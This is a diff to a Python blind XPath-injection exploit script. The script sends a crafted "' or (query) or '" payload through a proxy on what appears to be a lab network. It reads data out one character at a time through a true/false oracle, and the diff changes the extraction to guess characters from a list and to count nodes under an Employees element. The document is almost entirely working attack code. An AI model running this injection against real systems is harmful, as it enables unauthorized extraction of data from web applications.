@@ -3,14 +3,14 @@ import json,sys,requests, time
 from urllib.parse import quote_plus
 from tabulate import tabulate
 
-target = "test"
+
 proxies = {
     "http": "http://10.10.10.200:3128"
 }
 
 def oracle(query):
-    payload = (f"{target}' or ({query}) or '")
-    #print(payload)
+    payload = (f"' or ({query}) or '")
+    print(payload)
     headers = {
         "Content-Type": "application/x-www-form-urlencoded",
     }
@@ -43,13 +43,12 @@ def dumpNumber(query):
 # Dumping string
 def dumpString(query, length):
     val = ""
+    chars = "aeioutrnsldcmphbgfywkvjxzqAEIOUTRNSLDCMPHBGFYWKVJXZQ0123456789"
     for i in range(1, length+1):
-        c = 0
-        for p in range(7):
-            if oracle(f"string-to-codepoints(SUBSTRING(({query}),{i},1))&{2**p}>0"):
-                c |= 2**p
-        val += chr(c)
-        print(val)
+        for c in chars:
+            if oracle(f"substring({query},{i},1)='{c}'"):
+                val += c
+                print(val)
     return val
 
 
@@ -65,22 +64,18 @@ if func == 0:
 elif func == 1:
     
     # calc the first node
-    length = 1
-    while 1:
+    count = 1
+    length = 9
+    x = "name(/*[1])"
+    while 0:
         if oracle(f"string-length(name(/*[1]))={length}"):
             break
         length += 1
+    #node_name = dumpString(f"name(/*[1])")
 
-        print(dumpString(f"name(/*[1])",length))
+    while 1:
+        if oracle(f"count(/Employees/*)={count}"):
+            break
+        count += 1
+    print(count)
 
-    #if oracle(f"count(/users/*)={i}")
-
-elif func == 5:
-    payload = input("Payload : ")
-    print(dumpNumber(query))
-
-elif func == 6:
-    payload = input("Payload : ")
-    length = dumpNumber(query)
-    #string, length = payload.rsplit(maxsplit=1)
-    print(dumpString(string,int(length)))
